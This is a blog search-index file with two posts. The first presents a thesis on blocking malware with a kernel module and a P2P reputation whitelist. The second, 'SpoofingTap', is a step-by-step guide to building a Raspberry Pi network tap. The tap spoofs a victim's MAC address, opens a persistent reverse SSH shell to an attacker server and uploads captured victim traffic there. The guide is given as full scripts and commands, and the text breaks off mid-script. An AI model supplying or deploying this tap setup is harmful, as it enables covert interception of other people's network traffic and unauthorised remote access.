[
  
    {

      "title"    : "A P2P Reputation-based System for Blocking Malware at Kernel-Level",
      "url"      : "/thesis",
      "content"  : "In this article on my personal blog, I’ll present my thesis work, done 2 years ago at University of Salerno with Prof. Francesco Palmieri as my supervisor. The idea behind this work came from me, and was immediately supported by my supervisor. \n\n\n\nIntroduction\n\n\n\nTechnological diffusion, in particular of computer systems, is rapidly growing in recent years. According to an annual report published by Cisco, in 2021 each person will have, on average, more than three devices connected to the Internet. However, this growth is not associated with an adequate user awareness of computer security issues. In fact, as the number of devices on the network grew, the amount of sensitive data, online banking services and messaging systems also increased, attracting the attention of computer crime. In this scenario, the risk of fraud, digital theft and privacy violation is always around the corner and constantly keeps the experts busy, who try to find new countermeasures every time. Nowadays, one of the main issues in computer security is undoubtedly represented by malware, a term which identifies any software created with the intention of causing several different types of damage within the system in which it is executed. The first malware has already spread since the 1980s. Over the years, malware have become more complex, so they can be classified into different categories, such as, worms, trojans, spyware, adware, rootkit, ransomware, etc. In particular, ransomware are having a great impact in the media. Consider for example the WannaCry ransomware, which brought several organizations to their knees in various countries, demanding the payment of a ransom in Bitcoin. Another malware that has been much discussed in recent years is Stuxnet, developed in 2009, considered one of the first cyber-weapons. It has been created to hinder the Iranian nuclear program. However, the spread of this malware was not controlled, and it began to infect also devices outside the nuclear plants. This case brings to our attention the fact that a malware is no longer a danger only for simple personal computers but could potentially trigger a cyber war. \n\n\n\nContribution\n\n\n\nThe existing security mechanisms and tools are not always effective in identifying or stopping the malware actions in a timely manner. In this work we design and implement a system that is able to block any malicious software, based on its reputation, before it can cause damage to the system. In the case of ransomware, in fact, it becomes of crucial importance to prevent the massive execution of the malicious payload, since most likely it would cause the loss of data on many victim devices. The main idea underlying our proposal is to create a robust and reliable collaborative system, based on a simple user reputation mechanism, which enables to collect reports concerning the genuineness of a given software, with the aim of determining whether to allow its execution or not. \n\n\n\nIn detail, this work introduces a whitelist-based approach that, like other existing solutions, defines what is safe to execute, blocking everything else. It involves the use of a kernel module, operating at the runtime system level, that intercepts the system calls necessary for the execution of a file, verifying its reliability through a simple and lightweight but extremely robust reputation system available through a fully distributed interface. In detail, each executable file is identified within the system by a value calculated through a cryptographic hash function. Such a value will be used as a key within a Kademlia Distributed Hash Table (DHT) that makes reliability scores available to individual runtime systems in a fully distributed and replicated way. Moreover, each executable is associated with a score, updated according to the reports made by registered voluntary users, that is used to classify such executable as reliable or malicious. Again, each contributing user has a reputation that varies based on the number of correct reports he made, and which determines the weight given to reports made by such user. We remark that in the proposed solution only a central entity can write on the Kademlia DHT nodes, collect the users’ reports and send the signed updated scores. Each runtime system can check the genuinity of such scores by verifying them through against a traditional Public Key Infrastructure (PKI). Experimental results show that the latency introduced by the proposed system is acceptable. \n\n\n\nReputation systems and their problems\n\n\n\nThe concept of reputation concerns the credibility an individual has within a social community. Having a good reputation allows a person or a software to appear credible and reliable in the eyes of society. On the Internet, one of the main causes of bad reputation is the publication of false or inaccurate content, i.e., reports, reviews, etc. This is a serious problem, since almost anyone has the possibility to access the Web and publish, without any particular technical knowledge, false or untrusted material or false information. In recent years various attempts have been made to create systems capable of obtaining an automated estimate of the reputation of an entity in the Internet. Some common uses of these systems can be found on e-commerce websites, such as eBay or Amazon, or in online consulting communities, e.g., Stack Exchange. Therefore, a reputation system allows users to evaluate each other within an online community, in order to build trust through reputation. The fundamental idea is to allow the parties to evaluate each other, for example after the conclusion of a transaction, and to use the aggregated votes to obtain a trust or reputation score, which can help the other parties to decide whether or not to carry out transactions with that party in the future. A natural consequence of these systems is that they provide an incentive for good behavior, and therefore tend to have a positive effect on market quality. \n\n\n\nFurther areas in which reputation mechanisms find scope of\napplication are the following:\n\n\n\n\n Web search engines (e.g., PageRank);  Developer community (e.g., StackOverflow);  Internet security (e.g., TrustedSource);  E-mail (e.g., Vipul’s Razor, used for spam filtering);  Academia (e.g., h-index of a researcher).\n\n\n\nIn order for a reputation system to work effectively, the following three properties must be strongly taken into account. In detail, each entity should:\n\n\n\nHave a long life and create reliable expectations about future interactions; Capture and distribute feedback on previous interactions; Use feedback to drive trust. \n\n\n\nThese three properties are of paramount importance to build reliable reputations, and everything revolves around a fundamental element, which is user’s feedback. We remark that although several attempts have been made to build reputation systems that are not based on feedback, in the state of the art the feedbacks still represent the basis of a reputation system. However, feedbacks may bring up three main problems: \n\n\n\nReluctance of users to provide feedback when this is not mandatory. If there is a large flow of interactions in an online community, but no feedback is collected, the trust and reputation environment cannot be formed; To get negative feedback from users, who are conditioned by several factors, such as fear of retaliation. In fact, when feedback is not anonymous, many users are afraid of receiving a negative feedback in turn; To elicit honest feedback from users. Although there is no concrete way to establish the truthfulness of honest feedback in a community, new users will be more likely to leave honest feedbacks. \n\n\n\nOther pitfalls in reputation systems can include identity change and discrimination. Also in this case it is necessary to adjust user actions to obtain accurate and consistent feedbacks. \n\n\n\nAttacks on Reputation Systems\n\n\n\nReputation systems are generally vulnerable to certain types of attacks, which can be classified based on the attacker’s goals. However, depending on the context and the type of attack, it is possible to apply proper defense mechanisms. The main attacks that can be directed towards a reputation system are the following: \n\n\n\nSelf-promoting Attack: the attacker increases his reputation in a distorted way. An example is the Sybil Attack, where the attacker subverts the reputation system by creating a large number of pseudonyms and subsequently using them to gain a disproportionate influence. Whitewashing Attack: some system vulnerabilities are exploited to update the reputation of a user. Other types of attacks can be combined with the whitewashing attack to make it more effective. Slandering Attack: the attacker reports false data to lower the reputation of certain users. Denial of Service Attack: this attack, by using Denial of Service (DoS) attacks, prevents the spread of reputation values in the systems. Man in the Middle: an attacker could intercept the traffic and tamper with the feedback sent by other users. \n\n\n\nA Reputation-Based System for Malware Detection: A Technical Framework\n\n\n\nCurrent malware analysis techniques cannot deal with the action of new malicious software (i.e., 0-day), which has not yet been analyzed and detected. Therefore, it is clear that there is the need for preventive defense measures, to avoid the initiation of any harmful action within a system, as it could be the encryption of data by a ransomware. The main problem affecting most of the existing protection mechanisms is that they rely on a negative-based model (blacklist), that is, such mechanisms define what is dangerous, while implicitly letting everything else pass. Conversely, the main idea behind our proposal is to block, at the operating system level, the execution of any unknown software. The proposed system uses a positive-based model (whitelist), which defines what is allowed to pass, blocking everything else. Furthermore, we formulate a model for software classification, based on the “genuine” or “malicious” behaviors of the software. The proposed model allows the operating system to determine if it can execute a certain software. However, we remark that given the enormous amount of existing software, it is almost impossible to perform the classification by a single individual or a single entity. For this reason, the classification model we propose is based on user collaboration. In this way, over time, entire communities of users can contribute to the software classification process, and this can be an invaluable support for the various companies that are involved in malware analysis.\n\n\n\nThe Model\n\n\n\nIn the proposed model, for each executable file, a hash value is calculated, by which this file will be uniquely identified within the system. Each unclassified executable file has an initial reliability score value which is equal to 0. When the reliability score reaches a value greater than 1, then such executable is classified as reliable; on the other hand, if the reliability score value becomes less than −1, the evaluated executable is considered as malicious. Thus, we have a “guard range” [−1, 1] in which we have no sufficient information to effectively trust its execution and need to ask the interested users for its permission to execute. The score of each executable file is determined by users registered to the system, who contribute by sending reports concerning the reliability of such file. Of course, such users may be human entities or automatic malware checkers operating on a specific host. \n\n\n\n1) Weaknesses and Improvements to the Basic Model: It is necessary to make some considerations on the aforementioned basic model that could be vulnerable to several kind of attacks. For each of these attacks, we show how it can be mitigated or sometimes completely avoided. \n\n\n\nBad Mouthing Attack: A dishonest user could make incorrect reports to increase the score of a malicious executable file or damage the score of a reliable executable. To mitigate this issue, we introduce a reputation model for registered users. In such a model, the reports are weighed based on the reputation of each user, which can increase or decrease depending on the number of correct or incorrect reports such user has given. However, we remark that a malicious user could decide to carry out a certain number of correct reports, in order to increase his reputation, before making a dishonest report. To discourage this behavior, users who make incorrect reports are penalized by the model, by decreasing their reputation in a proportional manner. This means that the higher the user’s reputation, the greater the decrease in the case of making an incorrect report. Sybil Attack: Malicious users could subvert the system by registering to such system a disproportionate number of pseudonyms. It is important to point out that many users with a low reputation could still alter the score of an executable file. To overcome this problem, the user registration process makes use of digital certificates, issued by a Certification Authority (CA) for the verification of user identity. This means that the system registration process is controlled, and no user will be able to register several times using different pseudonyms. Man in the Middle Attack: An attacker could decide to intercept and tamper the reports of other users, for the purpose of altering the score of an executable file or damaging the reputation of an honest user. To prevent this type of attack, all the communication between the server that collects the reports and the users belonging to the system takes place by using encrypted connections. In addition, any store and lookup access to the P2P frontend repository is protected by digital signatures, ensuring integrity of all communications with Kademlia nodes. Denial of Service Attack: Centralized systems are typically vulnerable to Denial of Service (DoS) attacks; distributed systems, on the other hand, are usually less vulnerable if sufficient redundancy is used, so that incorrect behavior, or the loss of some participants, will not affect the functioning of the entire system. Therefore, the proposed solution is based on a decentralized front-end architecture based on Kademlia P2P overlay that interfaces the kernel module performing runtime checks. Such interface is the most critical element potentially exposed to DoS, so that the use of a Kandemlia infrastructure for storing reliability information, can effectively mitigate the effects of these attacks. Indeed, the algorithm used by Kademlia nodes to record each other’s existence is able to resist to the most common DoS attacks. \n\n\n\nIn light of these observations, we improve and extend the basic model described above, by providing it with a user reputation mechanism which works as follows. Each new user joining the system has an initial reputation value equal to 0.5 and such a value can fluctuate from a minimum of 0 to a maximum of 1. Again, a user whose reputation falls below 0.01 will no longer be able to make reports. The reputation of each user is used to weigh the reports he made, that is, the more correct reports a user makes, the more his reputation grows; on the other hand, as the number of erroneous reports increases, the reputation of the user decreases. To determine whether the report concerning an executable file is correct or not, the overall score associated with such executable must reach a value that can be classified as reliable or malicious. For example, if the score related to an executable file becomes reliable, all the users who have made a positive report for such file will see their reputation grow. On the contrary, users who have made a negative report, will see their reputation decrease. Moreover, once an executable file has been classified as reliable or malicious, subsequent reports made by other users will increase (or decrease) the score further but will not change the reputation of such users. We have made this choice since a malicious user could send positive reports for already classified executable files, in order to easily increase their reputation. We remark that the score related to an executable file is not updated immediately, upon the receipt of a single report made by a user, but at the end of a fixed time window. More precisely, the proposed system collects the reports received within a fixed time window and, when such a window expires, it calculates a weighted average which will be added to the executable file score. \n\n\n\n2) Formalization of the Improved Model: \n\n\n\nThe model described above, operating according to a time-slotted logic with fixed time slots of length , can be formalized as follows. Let  be an executable file and  the score associated with such file at the time . Each new file , appearing at the time  has an initial score value equal to  and it will be classified as reliable or malicious, based on the values  and , respectively. Again, let  be a user joining the system and  the reputation value of such user at time . Assuming the instant  as the moment when a user joins the system, we set  for each new user . The reputation  of a generic user  may fluctuate within the interval , where  indicates that the user is totally unreliable and  the opposite. \n\n\n\nLet  denote a time window of a fixed duration. The system collects all the reports received for each executable file and, at the end of , it calculates a value representing the weighted average computed on all the reports for each executable .\nFinally, the system adds such a value to .\n\n\n\n\nConsidering  as the report relative to the executable file , sent by user , within the time window ,  can assume values of  or  , in cases of positive (can execute) or negative\n(do not execute) reporting, respectively. We remark that a user\n can issue a single report  within a time slot for each\nexecutable file , so that if multiple reports are generated for the same file during a time window  occurring after the last update, the last report received overwrites the previous ones.\n\n\n\n\nAgain, the weighted average of the reports, relative to an\nexecutable file , is calculated at the end of the window  according to Eq. :\n\n\n\n\n\n\n\n\nwhere  is the number of reports collected for the executable file  , within the time window  .  Therefore, the final updated score  at the end of the time window  can be characterized by Eq. : \n\n\n\n .\n\n\n\nWhen the  score exits from the interval  , the executable file  is classified as reliable if positive or malicious otherwise, and the reports previously sent by users for  will contribute to update their reputation. If the report  is consistent with the classification just carried out (the sign matches), the reputation of the user  grows, otherwise it decreases. More precisely, the value  will increase or decrease according to its value at time , based on two coefficients of proportionality, namely,  and , both defined in the range  , as follows:\n\n\n\n\n  \n\n\n\nwhere:\n\n\n\n\n\n\n\n\n\n\n\n\nReasonable values for the two coefficients of proportionality could be  and  . In this way, a user who makes a series of correct reports will gradually see his reputation grow, until it reaches the maximum value allowed. Instead, a user who makes a wrong report, will see his reputation halved. Therefore, this choice allows to give a greater weight to incorrect reports, so as to discourage any attacks on the system. In fact, when , the user  will be no longer able to make reports. \n\n\n\nFinally, if the value  returns within the interval  ,\neach user to whom the reputation was increased (or decreased)\nwill be subtracted (or added) a value equal to the increment\n(or to the decrease) previously received.\n\n\n\n\nSystem Architecture\n\n\n\nThe architecture of the proposed solution involves the use of a distributed hash table and a kernel module for trapping execution, which is loaded by the operating system. The aim of the overall model is to classify a very large number of executable files and to manage the numerous reports coming from users, regarding the score of the executable files they are going to execute. However, it is important to remark that the number of such requests is potentially enormous, since the system could send a request for every file it tries to execute. For this reason, it is not appropriate to make reliability scores available by means of a centralized service architecture, since it could represent a performance bottleneck as well as a Single Point Of Failure (SPOF) and hence it could be easily vulnerable to DoS attacks. Inspired by these design criteria, our model is based on a hybrid architecture, composed of a Central Server for collecting users’ reports and a DHT based on Kademlia, for handling the interface to the scoring system in a fully distributed and replicated way. Kademlia employs a recursive algorithm for node lookups, routing queries and locating nodes within a topology driven by a XOR-based distance metric between points in the key space. Since such metric is fully symmetric, each participant node receives lookup queries from exactly the same distribution of nodes contained in their routing tables. As a consequence, lookup operations return with an extremely high probability a key-value pair stored in  , where  is the number of nodes and  is a small constant characterizing the operation. \n\n\n\n  System architecture. \n\n\n\nIn detail, the DHT stores the key-value pairs, consisting of the hash of an executable file and its associated score, together with a timestamp information. We remark that in our proposal, the nodes of the P2P overlay allow the writing only to the Central Server, which represents an authoritative entity, while anyone can read and request the score for an executable. The limitation in writing is guaranteed by the use of a digital signature scheme, used whenever a (hash, score) key-value pair is sent for storage on DHT. However, only signing this pair could make the system vulnerable to replay attacks. Indeed, any attacker could be able to capture a message sent on the P2P overlay, and then read the key- value pair and its digital signature. Again, the attacker could keep this message and re-send it later, thus succeeding in restoring the old score associated with an executable file. To overcome this problem, we use a time stamp indicating the expiration time for a specific message. More formally, let  be a generic digital signature scheme. Let  and  be the keys needed to sign and verify a given message using  , respectively. The  sends the following message (i.e., up) to the P2P overlay: \n\n\n\n  \n\n\n\nwhere signature is computed by Eq. as follows ( ∥ denotes the concatenation symbol ):\n\n\n\n   \n\n\n\nWithin the up message, hash represents the key, while the triple (score, timestamp, signature) denotes the value to be stored in the DHT, respectively. The use of the stored signature allows an accessing entity to check the integrity and genuinity of any entry stored on the DHT, by using the public key  , available through a recognized PKI infrastructure. Thus, the digital signature is calculated by adding also a validity end date (timestamp), which makes the generated message unusable after a certain period of time. We stress that the Central Server acts as a Trusted Third Party (TTP), since it is the only entity which holds the private key used to sign the messages, as well as it is trusted by all other entities belonging to the system. Nowadays, many systems are based on TTPs to perform their operations in a fair and secure manner. For example, TTPs find scope of application in fair exchange protocols, authentication and certification systems, etc. Again, TTPs are used to incentivize honest behavior in some reputation-based systems and e-auction protocols. In detail, the Central Server collects all the reports received from the authenticated users and updates the scores of the executable files when the time window expires, by sending a signed message (up) containing the new value to the nodes of the DHT overlay. In the proposed system, the users are authenticated through a client certificate, issued to them by a CA at the end of a registration process, carried out to provide an appropriate verification of user identity. \n\n\n\nUser reputations are kept on the Central Server, which updates them and establishes who is allowed to send reports. It is important to emphasize that the separation of roles between the Central Server and the Kademlia DHT overlay guarantees that, even in the event of a server failure (due to an attack or technical problems), users’ operating systems are always able to determine whether an executable file is reliable or malicious, since this information can be obtained by the DHT. Again, we remark that the use of a DHT ensures reliability and availability of the data at any time, since Kademlia is known to provide provable consistency and performance also within fault-prone environments . Finally, the software layer on the user system, used to check the executable file before its execution, is implemented through a kernel module. The main idea is to hijack the execve system call. Hence, before any file execution, the kernel module calculates the SHA-256 hash of such a file and verifies its score, by sending a request to the DHT. If the file is classified as reliable, then it is executed normally, otherwise, if it is classified as malicious or has not yet received reports, the kernel module will prevent execution until it is not been classified as reliable. However, this design has the following two drawbacks:\n\n\n\nLatency: every execve system call needs to query the DHT before it can be executed. Obviously, this can cause system performance degradation also if Kademlia ensures response in a logarithmic time on the number of nodes, that have enough knowledge and flexibility to route queries through low-latency paths. In addition, Kademlia issues parallel asynchronous queries for mitigating the effects of timeout delays from failed nodes. Mandatory connection to the network: to determine if a file can be executed, an Internet connection is required to perform a verification on the Kademlia network. Thus, a disconnected system would be unusable. \n\n\n\nTo overcome such two limitations, we introduce a local cache, where the scores for each executable file are stored. In detail, this cache initially contains only the hashes of all the executable files belonging to the operating system and our system assigns to these files permanent execution permissions. In this way, a normal use of the system is still possible even without an Internet connection. In addition, for each executable file for which a check is performed on the DHT, the relative score is temporarily stored in the cache. By doing so, it is possible to avoid an access to the DHT for each further execution of a file. Thus, when a valid entry is present within the cache, such entry is used to drive the execution process. However, cache entries have a limited lifetime (that can be typically chosen as the length of the time slot T ) and all the cached data, when a connection is available, are automatically refreshed at their expiration through a new access to the DHT, so that updates to reliability scores are taken into account without affecting users’ execution performances. Notice that though this solution does not completely solve the latency problem, since there will still be a search in the cache for each execution, we can certainly say that the times are considerably reduced. Furthermore, a user with root privileges will be able to run new trusted files by adding them to the local cache (i.e. new compiled program files, or copied from trusted source).The figure below shows a diagram which outlines how the kernel module works within the proposed system. \n\n\n\n  Kernel module operation scheme. \n\n\n\nArchitecture Design and Implementation \n\n\n\nIn this section we outline the design and implementation aspects of a proof of concept reflecting the architecture presented above. More precisely, in this section we focus on the design and implementation of both the kernel module for blocking the execution of malicious executable files and of the verification system accessible through the Kademlia overlay DHT. The PoC (Proof of Concept) code is publicly available on my GitHub, and has been made on Ubuntu 12.04.1 OS with kernel version 3.2.0-29-generic. The choice is due to the ease with which it was possible to perform the hijacking of a system call, as explained below.\n\n\n\nExecution Trapping Kernel Module \n\n\n\nThe implemented kernel module is characterized by the following three main functionalities: \n\n\n\n Hijacking of the execve system call, through hooking of the system call table;  SHA-256 hashing of the executable file;  Checking the executable’s score, by connecting to the Kademlia network.\n\n\n\n 1) Hijacking: In order to hijack the execve system call, we use a fairly common technique, namely, the hooking of the system call table. In detail, the processes in the user space call a series of interrupts to the kernel space, which are stored in a predefined table during the Linux system initialization process. The pointers to different interrupt management functions are then stored. The idea is to appropriately manipulate these pointers within the table, in order to insert the desired actions. At the end of the added actions, the action of the original system call is then restored, to avoid crashes or anomalies in the operating system.  2) Hashing: Once the system call has been hijacked, we can add the piece of code we want to execute. In our case, this code is inserted into the new execve function. Our goal is to check the reliability of a given file before it is executed. The system then calculates a SHA-256 hash of that file to verify its relative score. If the executable file is considered as reliable, then the original system call is executed, thus guaranteeing the normal behavior of the system. Otherwise, the system call will not be executed. 3) Verification: The final step is to verify the reliability of the executable file, by using the calculated hash. The verification is carried out by connecting to the Kademlia network or looking inside the local cache if it is not the first execution of the file. However, it is important to point out that for the development of a kernel module, not all the standard libraries normally used in user space C programming are available. To overcome this limitation, we use a local socket, which connects the kernel module with an application executed in user space. More precisely, we use an AF UNIX connection type, which allows the communication between a client and a server running on the same host, without the need to have an IP address. In detail, for the bind operation it is used a file descriptor, which points to a file within the local file system. Thus, the kernel module acts as a client, connecting to the application interfacing with the DHT and managing the local cache, executed in user space, which acts as a server (i.e., a daemon process) and waits for connections. When the kernel module makes a request to the server, it receives a Boolean value through which it determines whether or not it can execute the file. \n\n\n\nKademlia\n\n\n\nFor the realization of the DHT we started from an already existing implementation, written in Python and available on GitHub. In this section, we focus on the changes made to this existing code. The goal of our Kademlia implementation is to allow the write operation on the nodes only to a single authoritative entity. This is achieved through the use of a digital signature scheme. In detail, all nodes know the public key of the TTP and can verify the signature of an incoming store request message as well as the authenticity of a retrieved value. On the other hand, only the Central Server holding the private key is able to write on the DHT nodes. The changes on the Kademlia implementation were carried out within the STORE and FIND functions, where each Kademlia node, before storing the content, checks the signature and the timestamp, thus ensuring the authenticity of the message and the security with respect to Replay attacks. Analogously any lookup operation within the DHT before returning results performs a check of the aforementioned signature fields by using the public key of the TTP. \n\n\n\nExperimentation and Results\n\n\n\n In this section we provide implementation details about the proof of concept developed to assess the effectiveness and the performance of our proposal. Such assessment has clearly shown that the framework does not significantly impact neither the runtime performance of users’ executions nor the overall operating system activity. The Proof of Concept (PoC) code is publicly available on GitHub, and has been made on Ubuntu 12.04.1 OS with kernel version 3.2.0-29-generic. The choice is due to the ease with which it was possible to perform the hijacking of a system call.\n\n\n\nExecution test \n\n\n\nAs a sample untrusted executable, we created and compiled the “Hello World” C program shown below:\n\n\n\n#include \nint main()\n{ printf (\"Hello World! \\n\"); }\n\n\n\nSince this program never executed, its hash is not present neither in the local cache nor on the DHT. Thus, such a program must not be executed by the system once the kernel module is loaded. As additional sample trusted executables we used the /bin/ls and /bin/uname standard Linux commands, whose reliability score has been pre-asserted on the DHT. \n\n\n\nSystem performance\n\n\n\nTo evaluate the performance of our proposed framework, we analyzed the execution times of the aforementioned programs before and after loading the kernel module, as well as when the reliability information is already located in the local cache or it is yet in the DHT, in order to appreciate the latency introduced by both the caching mechanism and DHT access. The tests were carried out by means of a virtual machine running on an external hard drive at 5400 RPM, connected to the host system via USB 3.0. The resources assigned to the virtual machine are 1 GB RAM and a single core of the Intel Core i7 processor at 2.2 GHz. The total elapsed time necessary to execute the sample applications with and without using the kernel module, and when information is already store in the cache or need to be accessed on the DHT, measured through the Linux time command is shown in the table below, where average values from 10 runs have been reported. \n\n\n\n  Execution time of some programs (in msecs) with and without Kernel Module execution Trap and DHT access &lt;/figure&gt;\n\nWe can appreciate that when the information is successfully cached, the average latency introduced by the execution of a program by the kernel module is negligible. Therefore, after the first execution of a file, which requires the connection to the Kademlia network and hence takes a longer time, due to both access to the P2P overlay and signature checking, all the following runs are impacted in a very limited way, respect to the enormous advantages introduced in terms of the overall system security. \n\nConclusion\n\nWe presented a novel lightweight solution to deal with unknown malware execution. Unlike most of the existing protection mechanisms, which are based on the concept of blacklists, this work relies on a whitelist-based approach, which is more conservative and can be summarized by the aphorism “prevention is better than cure”. We have realized the system architecture according to a hybrid logic and coupled it with a component that manages the reputation of users who contribute to the malware classification. The proposed system guarantees data persistence, that is, the availability of information even in the event of malfunctions or attacks. Furthermore, in this work we describe how to prevent different types of attacks that can subvert the reputation of the system. Finally, we show that the latency introduced by our system for the execution of a given file is acceptable, due to the use of a local cache. The presented system, surely brings limits of use on Desktop OS, due to the enormous number of runned applications, and for the new ones installed. However it represents an interesting and effective solution for server systems, or embedded systems for IoT."

    },
  
    {

      "title"    : "SpoofingTap - a network tap with automatic MAC address spoofing",
      "url"      : "/spoofingtap",
      "content"  : "In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks.\n\nCreate a network tap on a Linux machine is quite simple; you only need two Ethernet interfaces and configure a virtual bridge between them. This type of tap network is very interesting because, as I mentioned earlier, is able to use the same victim’s network to connect to the Internet. You could, for example, use the connection to send to a remote server a copy of traffic captured with tcpdump. A simple example made on Raspberry Pi and available online, is NTap.\n\n\n  \n\n\nHowever, in some network infrastructures with specific security policies (eg. in a company), often MAC address whitelists are defined to allow access only to authorized machines. In these circumstances, a network tap made with a virtual bridge, continue to provide to the victim machine network access, but would not be able to connect to the same, as it occurs in the network with a MAC address not recognized. The only way to access the network, is to spoof the MAC address of the victim, which is present in the whitelist.\n\n\n  \n\n\nSpoofingTap is based on this idea, and it was made on a Raspberry Pi Zero for several reasons:\n\n\n  small size and portability\n  low power consumption\n  affordable cost ($5 for the only board)\n\n\nThe Pi Zero however has no network interfaces then, in addition to a microSD where to install the OS, you need two Ethernet network adapters. In this regard we have some alternatives:\n\n\n  Use a USB Ethernet Hub, which will be connected in cascade a second Ethernet USB adapter.\n  Use a Micro-USB Ethernet adapter and take advantage of the GPIO interface to connect a second Ethernet controller chip based on the economic enc28j60 (PiJack). This solution has the advantage of having a more compact device, however, it limits the connection speed to 10Mbps.\n  Use a slightly more expensive Ethernet + USB shield (available here), to which we will add a second USB Ethernet adapter. This latter alternative, although has a higher cost, is to be considered the best; in fact it allows us to make the device more compact and at the same time to maintain a 100Mbps link speed.\n(I got to get in touch with the person that produces the shield, to test the feasibility of a version with two Ethernet ports 100Mbps. The change is possible however, for reasons of cost, the producer would be willing to implement it only if there will be a good number of requests.)\n\n\n\n  \n\n\nOnce you’ve connected the two network interfaces, which we call the eth0 and eth1, you must configure the operating system (Raspbian in our case).\n\n\nSTEP 1. Configure the network interfaces by editing the file /etc/network/interfaces as follows:\nauto eth0\nallow-hotplug eth0\niface eth0 inet static\n        address 1.0.0.1\n        netmask 255.255.255.0\n\nauto eth1\nallow-hotplug eth0\niface eth0 inet manual\n\n\nThe interface eth0 is configured with a static ip address that will be seen by the victim machine as a gateway. The interface eth1 will instead be the one connected to the external network.\n\n\nSTEP 2. We define the iptables rules to forward traffic from the interface eth0 to eth1 and enable ip forwarding on the system.\n\n# Set rules in iptables\nsudo iptables -A FORWARD -o eth1 -i eth0 -s 1.0.0.0/24 -m conntrack --ctstate NEW -j ACCEPT\nsudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT\nsudo iptables -t nat -F POSTROUTING\nsudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE\n\n# Save iptables rules\nsudo iptables-save &gt; /etc/iptables.sav\n\n# Edit /etc/sysctl.conf and uncomment:\nnet.ipv4.ip_forward=1\n\n\n\nSTEP 3. We configure dnsmasq to assign an IP address to the victim machine when it is connected to the eth0 port on tap.\n# DHCP/DNS server\nsudo apt-get install dnsmasq\nsudo /etc/init.d/dnsmasq stop\n\n#backup of default conf\nsudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf-backup\n\n# Edit /etc/dnsmasq.conf and add the following two lines:\ninterface=eth0\ndhcp-range=1.0.0.2,1.0.0.50,72h\n\n\n\nSTEP 4. Add the following commands to /etc/rc.local to run at system boot.\n# Edit /etc/rc.local and add the following lines before the \"exit 0\" line:\niptables-restore &lt; /etc/iptables.sav\n/etc/init.d/dnsmasq start\n\n\n\nSTEP 5. Configure the script for automatic spoofing MAC address of the victim. So, the interface eth1 will occur on the network with the MAC address of the victim.\n# Install ifplugstatus to get status of ethernet devices\nsudo apt-get install ifplugd\n\nWe create the file /etc/spoofing_script.sh with the following contents:\n#!/bin/bash\n# When Pi Zero starts, eth0 must be connected to the victim's machine\n# eth1 must be connected to the router/external network\n\n# Steal the MAC address of victim's machine connected to eth0\nMAC_ADDR=$(arp -an -i eth0 | cut -d' ' -f 4)\nwhile [ ! `echo $MAC_ADDR | egrep \"^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$\"` ]; do\n\tMAC_ADDR=$(arp -an -i eth0 | cut -d' ' -f 4)\ndone\necho \"$(date) MAC address copied: $MAC_ADDR\\n\"\n\n\n# Spoof the MAC address copied on eth1 interface\nip link set dev eth1 down\nip link set dev eth1 address $MAC_ADDR\nip link set dev eth1 up\necho \"$(date) MAC address spoofed: $MAC_ADDR\"\n\n# LED flashing signaling the end of spoofing operation\ncounter=0\nwhile [ $counter -lt 4 ]; do\n        echo 1 &gt; /sys/class/leds/led0/brightness\n        sleep 0.2\n        echo 0 &gt; /sys/class/leds/led0/brightness\n        sleep 0.2\n        counter=$(expr $counter + 1)\ndone\n\n\nGive execute permission to the script you just created and add it to /etc/rc.local  to run at boot.\n#add execution permission\nsudo chmod +x /etc/spoofing_script.sh\n\n# Edit /etc/rc.local and add the following lines before the \"exit 0\" line:\n/bin/sh /etc/spoofing_script.sh &gt;&gt; /home/pi/log_spoofing.txt\n\n\n\nSTEP 6. We configure the tap for the automatic opening of a persistent reverse shell. You will need to have a remote server running with SSH service listening on port 2222 (in this way we make sure not to use a filtered reserved port).\n# Install Autossh\nsudo apt-get install autossh\n\t\n# Get a shell as root\nsudo su\n\n# Execute ssh-keygen command\nssh-keygen\n\n# Enter the path when requested and leave empty passphrase (output sample below)\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): */root/.ssh/nopwd*\nEnter passphrase (empty for no passphrase): *leave empty*\nEnter same passphrase again: *leave empty*\n\n# Copy the generated public key on your middleman server (replace \"user\" and \"middleman_server\" with your username and middleman ssh server)\nssh-copy-id -i .ssh/nopwd.pub -p 2222 user@middleman_server\n\n#Edit /etc/rc.local and add the following line before the \"exit 0\" line (replace \"user\" and \"middleman_server\" with your username and middleman ssh server):\nautossh -M 10984 -N -f -o \"PubkeyAuthentication=yes\" -o \"PasswordAuthentication=no\" -i /root/.ssh/nopwd -R 6666:localhost:22 user@middleman_server -p 2222 &amp;\n\n# Reboot the system\nreboot -h now\n\n# Execute this command on your middleman_server to test\nssh -p 6666 pi@127.0.0.1\n\n\n\nSTEP 7. We can set up a script that automatically send to our remote server a signed copy of the traffic captured with tcpdump. The signature assures us integrity, authenticity and non-repudiation of the captured traffic.\n\nFirst, we generate the keys and install necessary tools:\n\n#Key generation\nsudo openssl req -nodes -x509 -sha256 -newkey rsa:4096 -keyout \"SpoofingTap.key\" -out \"SpoofingTap.crt\" -days 365 -subj \"/C=IT/ST=Italia/L=Napoli/O=Private/OU=IT Dept/CN=SpoofingTap\"\n\n#Subsequent verification of the file signed with the key\nopenssl dgst -sha256 -verify  &lt;(openssl x509 -in \"SpoofingTap.crt\"  -pubkey -noout) -signature dump.pcap.sha256 dump.pcap\n\n#install tcpdump and inotify-tools\nsudo apt-get install tcpdump inotify-tools\n\n\nThen we define the script to automatically upload captured traffic on the server. Create the file /etc/mirroring.sh with the following content:\n\n#!/bin/bash\nmkdir /tmp/dumps\nmkdir /tmp/checksums\n\nfilename=\"\"\n\n#Listener for new dump files \ninotifywait --format '%f' -m -r -e create \"/tmp/dumps\" | while read f\n\ndo\n        if [ \"$filename\" != \"\" ]; then\n                #sign the new dump file\n                openssl dgst -sha256 -sign \"/home/pi/SpoofingTap.key\" -out \"/tmp/checksums/$filename.sha256\" \"/tmp/dumps/$filename\"\n                \n                #Upload on the server of file dump and its sign\n                scp -P 2222 -i /root/.ssh/nopwd \"/tmp/checksums/$filename.sha256\" user@middlemad_server:/home/user/checksums &amp;&amp;\n                scp -P 2222 -i /root/.ssh/nopwd \"/tmp/dumps/$filename\" user@middleman_server:/home/user/dumps 